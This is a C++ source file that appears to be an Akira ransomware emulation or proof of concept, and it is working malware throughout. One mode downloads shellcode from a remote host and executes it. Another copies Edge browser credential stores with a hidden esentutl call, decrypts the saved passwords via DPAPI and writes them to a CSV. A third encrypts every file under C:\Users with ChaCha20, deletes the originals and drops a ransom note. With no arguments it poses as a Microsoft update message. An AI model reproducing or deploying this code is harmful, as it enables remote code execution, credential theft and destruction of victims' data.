#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <winternl.h>
#include <bcrypt.h>
#include <dpapi.h>
#include <sqlite3.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <fstream>
#include <iostream>
#include <iomanip>
#include <sodium.h>
#include <filesystem>
#include <cstring>
#include <cstdint>
namespace fs = std::filesystem;

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "ws2_32.lib")   // only for TCP socket (user-mode)

// -----------------------------------------------------------------
// ntdll prototypes (part of /c)
// -----------------------------------------------------------------
extern "C" {
	NTSTATUS NTAPI NtAllocateVirtualMemory(
		HANDLE    ProcessHandle,
		PVOID* BaseAddress,
		ULONG_PTR ZeroBits,
		PSIZE_T   RegionSize,
		ULONG     AllocationType,
		ULONG     Protect);

	NTSTATUS NTAPI NtCreateThreadEx(
		PHANDLE                 ThreadHandle,
		ACCESS_MASK             DesiredAccess,
		POBJECT_ATTRIBUTES      ObjectAttributes,
		HANDLE                  ProcessHandle,
		PVOID                   StartRoutine,
		PVOID                   Argument,
		ULONG                   CreateFlags,
		SIZE_T                  ZeroBits,
		SIZE_T                  StackSize,
		SIZE_T                  MaximumStackSize,
		PVOID                   AttributesList);

	NTSTATUS NTAPI NtWaitForSingleObject(
		HANDLE Handle,
		BOOLEAN Alertable,
		PLARGE_INTEGER Timeout);

	NTSTATUS NTAPI NtClose(HANDLE Handle);
}

//#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)

// -----------------------------------------------------------------
// tiny HTTP downloader (simple TCP socket, part of /c)
// -----------------------------------------------------------------
std::vector<BYTE> download(const char* host, const char* path, uint16_t port = 80)
{
	WSADATA wsa; WSAStartup(MAKEWORD(2, 2), &wsa);
	SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (s == INVALID_SOCKET) return {};
	sockaddr_in sa{};
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = inet_addr(host);

	if (connect(s, (sockaddr*)&sa, sizeof(sa)) == SOCKET_ERROR) { closesocket(s); return {}; }

	std::string req = "GET " + std::string(path) + " HTTP/1.1\r\nHost: " + host + "\r\n\r\n";
	send(s, req.c_str(), (int)req.size(), 0);

	std::vector<BYTE> blob;
	char buf[4096];
	int n;
	while ((n = recv(s, buf, sizeof(buf), 0)) > 0)
		blob.insert(blob.end(), buf, buf + n);
	closesocket(s); WSACleanup();

	// crude HTTP header strip
	for (auto it = blob.begin(); it < blob.end() - 3; ++it)
		if (it[0] == '\r' && it[1] == '\n' && it[2] == '\r' && it[3] == '\n') {
			blob.erase(blob.begin(), it + 4);
			break;
		}
	return blob;
}

// -----------------------------------------------------------------
// shellcode runner (pure ntdll, part of /c)
// -----------------------------------------------------------------
void run_shellcode(const std::vector<BYTE>& sc)
{
	if (sc.empty()) return;

	PVOID base = nullptr;
	SIZE_T size = static_cast<ULONG>(sc.size());
	NTSTATUS st = NtAllocateVirtualMemory(
		NtCurrentProcess(), &base, 0, &size,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(st)) return;

	memcpy(base, sc.data(), sc.size());

	HANDLE hThread = nullptr;
	st = NtCreateThreadEx(&hThread, GENERIC_ALL, nullptr, NtCurrentProcess(),
		(PVOID)base, nullptr, 0, 0, 0, 0, nullptr);
	if (NT_SUCCESS(st))
		NtWaitForSingleObject(hThread, FALSE, nullptr);

	NtClose(hThread);
}


// -----------------------------------------------------------------
// CONFIGURATION (part of /e)
// -----------------------------------------------------------------
static constexpr char EXT[] = ".akira";
const char* NOTE = R"(
Hi friends,

Whatever or whoever you are and whatever your title is, if you're reading this it means the internal infrastructure of your company is fully or partially dead, all your
well, for now let's keep all the tears and resentment to ourselves and try to build a constructive dialogue. We're fully aware of what damage we caused by it.
1. Dealing with us you will save A LOT due to we are not interested in ruining your financially. We will study in depth your finance, bank & income statement
2. Paying us you save your TIME, MONEY, EFFORTS and be back on track within 24 hours approximately. Our decryptor works properly on any files or systems, so
3. The security report or the exclusive first-hand information that you will receive upon reaching an agreement is of a great value, since NO full audit of y
4. As for your data, if you fail to agree, we will try to sell personal information/trade secrets/databases/source codes - generally speaking, everything that
5. We're more than negotiable and will definitely find the way to settle this quickly and reach an agreement which will satisfy both of us.
If you're indeed interested in our assistance and the services we provide you can reach out to us following simple instructions:
1. Install TOR Browser to get access to our chat room - https://www.torproject.org/download/
2. Paste this link - https://akiralkzxq2dsrzsrvbr2xgbbu2wgsmxryd4csefameg52n7efvrziq.onion
3. Use this code - REDBIKE-POC-2024 - to log into our chat.
Keep in mind that the faster you will get in touch, the less damage we cause.
)";

// (32-byte ChaCha20 key encrypted with RSA)
static const unsigned char CHACHA_KEY[crypto_stream_chacha20_KEYBYTES] = {
	0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,
	0x09,0x0A,0x0B,0x0C,0x0D,0x0E,0x0F,0x10,
	0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,
	0x19,0x1A,0x1B,0x1C,0x1D,0x1E,0x1F,0x20
};
// -----------------------------------------------------------------
// E helpers
// -----------------------------------------------------------------

bool encrypt_file(const fs::path& in)

{
	// open input
	std::ifstream src(in, std::ios::binary);
	if (!src) return false;
	// open output
	fs::path out = in.string() + EXT;
	std::ofstream dst(out, std::ios::binary);
	if (!dst) return false;
	// random nonce (96-bit)
	unsigned char nonce[crypto_stream_chacha20_NONCEBYTES];
	randombytes_buf(nonce, sizeof(nonce));
	dst.write(reinterpret_cast<char*>(nonce), sizeof(nonce));
	// stream-cipher in one pass
	constexpr size_t CHUNK = 1 << 20; // 1 MiB
	std::vector<unsigned char> buf(CHUNK);
	std::vector<unsigned char> cipher(CHUNK);
	uint64_t offset = 0;
	while (src.good())
	{
		src.read(reinterpret_cast<char*>(buf.data()), buf.size());
		std::streamsize n = src.gcount();
		if (n == 0) break;
		crypto_stream_chacha20_xor_ic(cipher.data(), buf.data(), n, nonce, offset, CHACHA_KEY);
		dst.write(reinterpret_cast<char*>(cipher.data()), n);
		offset += n;
	}
	return true;
}
void drop_note(const fs::path& dir)
{
	std::ofstream note(dir / "README.txt");
	note << NOTE;
}
void process_directory(const fs::path& dir)
{
	// 1. always drop the note in the current directory
	std::ofstream(dir / "README.txt") << NOTE;
	// 2. then walk the directory
	for (auto const& entry :
		fs::recursive_directory_iterator(dir,
			fs::directory_options::skip_permission_denied))
	{
		if (entry.is_directory()) {
			// directory we just entered → drop note
			std::ofstream(entry.path() / "README.txt") << NOTE;
			continue;
		}
		const fs::path file = entry.path();
		if (file.extension() == EXT) continue; // already encrypted
		if (file.filename() == "README.txt") continue; // never encrypt the note
		if (encrypt_file(file))
			fs::remove(file);
	}
}

// --------------------------------------------------------------------------
// DPAPI Helpers (part of /d)
// --------------------------------------------------------------------------
std::vector<BYTE> Base64ToBytes(const std::string& b64)
{
	DWORD len = 0;
	CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &len, nullptr, nullptr);
	std::vector<BYTE> out(len);
	CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, out.data(), &len, nullptr, nullptr);
	return out;
}
std::vector<BYTE> DPAPIUnprotect(const std::vector<BYTE>& cipher)
{
	DATA_BLOB in{}, out{};
	in.pbData = const_cast<BYTE*>(cipher.data());
	in.cbData = static_cast<DWORD>(cipher.size());
	if (!CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out))
		return {};
	std::vector<BYTE> plain(out.pbData, out.pbData + out.cbData);
	LocalFree(out.pbData);
	return plain;
}
bool InitAES_GCM(const std::vector<BYTE>& key32,
	BCRYPT_ALG_HANDLE& hAlg,
	BCRYPT_KEY_HANDLE& hKey)
{
	if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0))
		return false;
	// ULONG cb;
	BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
		(PUCHAR)BCRYPT_CHAIN_MODE_GCM,
		sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
	BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0,
		(PUCHAR)key32.data(),
		static_cast<ULONG>(key32.size()), 0);
	return true;
}
std::string AES_GCM_Decrypt(const std::vector<BYTE>& blob, BCRYPT_KEY_HANDLE hKey)
{
	if (blob.size() < 31) return "";
	BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
	BCRYPT_INIT_AUTH_MODE_INFO(info);
	info.pbNonce = const_cast<BYTE*>(blob.data() + 3); // 12 bytes
	info.cbNonce = 12;
	info.pbTag = const_cast<BYTE*>(blob.data() + blob.size() - 16); // 16 bytes
	info.cbTag = 16;
	DWORD cipherLen = static_cast<DWORD>(blob.size() - 31);
	std::vector<BYTE> plain(cipherLen);
	DWORD pcb = 0;
	NTSTATUS nt = BCryptDecrypt(hKey,
		const_cast<BYTE*>(blob.data() + 15),
		cipherLen,
		&info,
		nullptr, 0,
		plain.data(), plain.size(),
		&pcb, 0);
	if (nt != 0) return "";
	plain.resize(pcb);
	return std::string(plain.begin(), plain.end());
}

void Esentutl_LCState() {
	char localAppData[MAX_PATH];
	if (!SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) {
		std::cout << "\n[!] Failed to get LOCALAPPDATA path" << std::endl;
		return;
	}

	std::string source = std::string(localAppData) + "\\Microsoft\\Edge\\User Data\\Local State";
	std::string destination = std::string(localAppData) + "\\TEMP\\K4j6hv345kj324hv5k234j2v3o5uhv.arika";

	// Check if destination file exists and delete it
	if (GetFileAttributesA(destination.c_str()) != INVALID_FILE_ATTRIBUTES) {
		if (!DeleteFileA(destination.c_str())) {
			std::cerr << "Failed to delete existing file: " << destination << " Error: " << GetLastError() << std::endl;
			return;
		}
		std::cout << "Deleted existing file: " << destination << std::endl;
	}

	// Build the esentutl command
	std::string command = "esentutl.exe /y \"" + source + "\" /d \"" + destination + "\"";
	// Execute command
	STARTUPINFOA si = { sizeof(si) };
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));

	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	if (!CreateProcessA(NULL, (LPSTR)command.c_str(), NULL, NULL, FALSE,
		CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
		std::cout << "\n[!] EsentUtl Function Could Not Copy Local State! Error: " << GetLastError() << std::endl;
		return;
	}

	WaitForSingleObject(pi.hProcess, INFINITE);

	DWORD exitCode;
	GetExitCodeProcess(pi.hProcess, &exitCode);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	if (exitCode != 0) {
		std::cout << "\n[!] esentutl failed with exit code: " << exitCode << std::endl;
	}
	else {
		std::cout << "\n[+] Local State copied successfully to: " << destination << std::endl;
	}
}

void Esentutl_LGData() {
	char localAppData[MAX_PATH];
	if (!SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) {
		std::cout << "\n[!] Failed to get LOCALAPPDATA path" << std::endl;
		return;
	}

	std::string source = std::string(localAppData) + "\\Microsoft\\Edge\\User Data\\Default\\Login Data";
	std::string destination = std::string(localAppData) + "\\TEMP\\L4j6hv345kjL4o9g7i9n0D7at2aj2v3o5uhv.arika";

	// Check if destination file exists and delete it
	if (GetFileAttributesA(destination.c_str()) != INVALID_FILE_ATTRIBUTES) {
		if (!DeleteFileA(destination.c_str())) {
			std::cerr << "Failed to delete existing file: " << destination << " Error: " << GetLastError() << std::endl;
			return;
		}
		std::cout << "Deleted existing file: " << destination << std::endl;
	}

	// Build the esentutl command
	std::string command = "esentutl.exe /y \"" + source + "\" /d \"" + destination + "\"";
	// Execute command
	STARTUPINFOA si = { sizeof(si) };
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));

	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	if (!CreateProcessA(NULL, (LPSTR)command.c_str(), NULL, NULL, FALSE,
		CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
		std::cout << "\n[!] EsentUtl Function Could Not Copy Local State! Error: " << GetLastError() << std::endl;
		return;
	}

	WaitForSingleObject(pi.hProcess, INFINITE);

	DWORD exitCode;
	GetExitCodeProcess(pi.hProcess, &exitCode);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	if (exitCode != 0) {
		std::cout << "\n[!] esentutl failed with exit code: " << exitCode << std::endl;
	}
	else {
		std::cout << "\n[+] Login Blob Data copied successfully to: " << destination << std::endl;
	}
}

// --------------------------------------------------------------------------
// Main
// --------------------------------------------------------------------------

int main(int argc, char* argv[]) {
	// If no arguments provided, show harmless message
	if (argc == 1) {
		std::cout << "\n[!] This update has already been installed on your computer. \n[-] MS-Patch: MS20250813 (Article KB345346J346)\n[+] Please verify at microsoft.com/check-hotfix CS1985432.\n ";
		return 0;
	}
	// Get the first argument
	std::string argument = argv[1];
	// Handle different arguments
	if (argument == "/c") {
		char addrstr[] = { "192.168.7.1" };
		if (argc >= 3) {
			// Use the third argument as the IP address
			strcpy(addrstr, argv[2]);
			std::cout << "\n[+] Using custom IP: " << addrstr << std::endl;
		}
		else {
			std::cout << "\n[+] Using default IP: " << addrstr << std::endl;
		}
		auto sc = download((const char*)addrstr, "/test.txt ", 9443);
		run_shellcode(sc);
		return 0;
	}
	else if (argument == "/d") {
		Esentutl_LCState();
		Esentutl_LGData();
		// 1. Build paths
		char localAppData[MAX_PATH];
		SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localAppData);
		std::string localStatePath = std::string(localAppData) + R"(\Temp\K4j6hv345kj324hv5k234j2v3o5uhv.arika)";
		std::string chromeRoot = std::string(localAppData) + "\\TEMP";
		// 2. DPAPI-decrypt AES key
		FILE* f = nullptr;
		fopen_s(&f, localStatePath.c_str(), "rb");
		if (!f) { std::cerr << "Cannot open Local State\n"; return 1; }
		fseek(f, 0, SEEK_END); long sz = ftell(f); fseek(f, 0, SEEK_SET);
		std::vector<char> json(sz);
		fread(json.data(), 1, sz, f);
		fclose(f);
		std::string jsonStr(json.begin(), json.end());
		size_t pos = jsonStr.find("\"encrypted_key\"");
		if (pos == std::string::npos) { std::cerr << "encrypted_key not found\n"; return 1; }
		pos = jsonStr.find(':', pos) + 2;
		size_t end = jsonStr.find('"', pos);
		std::string b64 = jsonStr.substr(pos, end - pos);
		std::cout << "\n[*] Encrypted Key = " << b64 << "\n\n" ;
		auto enc = Base64ToBytes(b64);
		if (enc.size() < 5 || memcmp(enc.data(), "DPAPI", 5)) { std::cerr << "Bad key header\n"; return 1; }
		auto key32 = DPAPIUnprotect(std::vector<BYTE>(enc.begin() + 5, enc.end()));
		if (key32.size() != 32) { std::cerr << "Key length != 32\n"; return 1; }
		// 3. Init AES
		BCRYPT_ALG_HANDLE hAlg = nullptr;
		BCRYPT_KEY_HANDLE hKey = nullptr;
		if (!InitAES_GCM(key32, hAlg, hKey)) { std::cerr << "AES init failed\n"; return 1; }
		// 4. Search the two usual locations explicitly
		const char* candidates[] = {
			"L4j6hv345kjL4o9g7i9n0D7at2aj2v3o5uhv.arika",
			"L4j6hv345kjL4o9g7i9n0D7at2aj2v3o5uhw.arika"
		};
		std::ofstream csv("decrypted_password.csv");
		csv << "index,url,username,password\n";
		int idx = 0;
		for (const char* sub : candidates) {
			char dbPath[MAX_PATH];
			sprintf_s(dbPath, sizeof(dbPath), "%s\\%s", chromeRoot.c_str(), sub);
			if (GetFileAttributesA(dbPath) == INVALID_FILE_ATTRIBUTES)
				continue; // file does not exist
			sqlite3* db;
			if (sqlite3_open_v2(dbPath, &db, SQLITE_OPEN_READONLY, nullptr) == SQLITE_OK) {
				std::cout << "[+] Opening " << dbPath << "\n";
				sqlite3_stmt* stmt;
				const char* sql = "SELECT action_url, username_value, password_value FROM logins";
				if (sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr) == SQLITE_OK) {
					while (sqlite3_step(stmt) == SQLITE_ROW) {
						const char* url = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
						const char* username = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
						const BYTE* cipher = static_cast<const BYTE*>(sqlite3_column_blob(stmt, 2));
						int len = sqlite3_column_bytes(stmt, 2);
						if (!url || !username || len < 31) continue;
						std::vector<BYTE> blob(cipher, cipher + len);
						std::cout << "Blob size = " << blob.size()
							<< " first bytes = "
							<< std::hex << std::setfill('0')
							<< (int)blob[0] << " " << (int)blob[1] << " " << (int)blob[2]
							<< std::dec << "\n";
						std::string password = AES_GCM_Decrypt(blob, hKey);
						std::cout << "URL: " << url << "\nUser: " << username << "\nPassword: " << password << "\n" << std::string(50, '-') << "\n";
						csv << idx++ << "," << url << "," << username << "," << password << "\n";
					}
				}
				sqlite3_finalize(stmt);
				sqlite3_close(db);
			}
		}
		if (hKey) BCryptDestroyKey(hKey);
		if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
		return 0;
	}
	else if (argument == "/e") {
		//fs::path root = "C:\\Custom\\Path";
		fs::path root = "C:\\Users"; // ACC TO ORIGINAL TTP FROM A-K-Ira
		if (argc >= 3) {
			// Use the third argument as the Path
			root = argv[2];
			std::cout << "\n[+] Using custom Path: " << root << std::endl;
		}
		else {
			std::cout << "\n[+] Using default Path: " << root << std::endl;
		}
		if (sodium_init() < 0) {
			std::cerr << "libsodium init failed\n";
			return 1;
		}
		if (!fs::exists(root)) {
			std::cerr << "Folder not found\n";
			return 1;
		}
		process_directory(root);
		return 0;
	}
	else {
		std::cout << "Unknown argument. Please try again. ";
		return 1;
	}
	return 0;
}

